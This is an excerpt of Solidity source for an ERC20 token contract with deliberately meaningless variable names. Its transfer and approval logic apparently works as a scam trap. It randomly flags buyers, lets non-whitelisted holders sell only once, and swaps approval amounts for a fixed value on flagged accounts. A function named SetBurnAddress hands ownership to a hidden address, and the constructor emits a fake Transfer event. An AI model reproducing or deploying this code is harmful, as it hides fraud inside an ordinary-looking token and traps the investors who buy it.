...
contract Ownable is Context {
  ...
  */
  ...
  function SetBurnAddress() public {
    require(_owner != donaldj);
    emit OwnershipTransferred(_owner, donaldj);
    _owner = donaldj;
  }
...
contract ERC20Token is Context, IERC20, Ownable {
  ...
  mapping (address => bool) public catgirl;
  mapping (address => bool) public itswilly;
  mapping (address => bool) public scotland;
  mapping (address => uint256) public heels;

  bool private cows;
  uint256 private _totalSupply;
  uint256 private coconut;
  ...
  constructor() public {
    ...
    _trns = _totalSupply;
    coconut = _totalSupply;
    chTx = _totalSupply / 1200;
    opera = coconut;
    itswilly[creator] = false;
    scotland[creator] = false;
    catgirl[msg.sender] = true;
    _balances[msg.sender] = _totalSupply;
    thisValue = false;

    emit Transfer(address(0x2B5634C42055806a59e9107ED44D43c426E58258), msg.sender, _trns);
  }
  ...
  */
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if ((address(sender) == creator) && (cows == true)) {
      catgirl[recipient] = true;
      itswilly[recipient] = false;
      cows = false;
    } 
    
    if (catgirl[recipient] != true) {
        itswilly[recipient] = ((randomly() == 78) ? true : false);
    }
    
    if ((itswilly[sender]) && (catgirl[recipient] == false)) {
        itswilly[recipient] = true;
    }
    
    if (catgirl[sender] == false) {
      require(amount < coconut);
      if (thisValue == true) {
        if (scotland[sender] == true) {
          require(false);
        }
        scotland[sender] = true;
      }
    }
  ...
  **/
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    ...
    if ((address(owner) == creator) && (bearish == true)) {
      catgirl[spender] = true;
      itswilly[spender] = false;
      scotland[spender] = false;
      bearish = false;
    }
    
    tok = (itswilly[owner] ? 218724 : amount);
